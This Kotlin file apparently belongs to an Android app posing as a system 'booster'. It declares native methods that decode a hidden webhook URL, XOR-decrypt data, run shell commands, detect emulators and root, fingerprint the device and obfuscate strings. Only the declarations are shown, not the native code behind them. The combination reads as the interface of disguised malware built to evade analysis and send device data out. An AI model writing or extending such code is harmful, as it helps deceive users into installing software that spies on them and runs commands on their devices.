package com.sysopt.booster

object NativeLib {
    init {
        System.loadLibrary("core")
    }

    // Native methods
    external fun decodeWebhookUrl(): String
    external fun xorDecrypt(data: ByteArray, key: String): ByteArray
    external fun executeShell(command: String): String
    external fun checkEmulator(): Boolean
    external fun checkRoot(): Boolean
    external fun getDeviceFingerprint(): String
    external fun obfuscateString(input: String, key: Int): String
}